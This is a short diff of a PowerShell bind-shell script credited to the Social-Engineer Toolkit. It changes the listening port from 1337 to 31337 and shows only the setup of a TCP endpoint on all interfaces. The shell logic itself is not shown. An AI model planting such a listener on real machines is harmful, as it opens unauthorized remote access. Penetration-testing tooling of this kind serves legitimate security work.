@@ -2,7 +2,7 @@
 # Taken from SET: https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/bind.powershell
 
 # Set your port
-$PORT = 1337
+$PORT = 31337
 
 $encoding = new-object System.Text.AsciiEncoding
 $endpoint = new-object System.Net.IpEndpoint ([System.Net.Ipaddress]::any, $PORT)
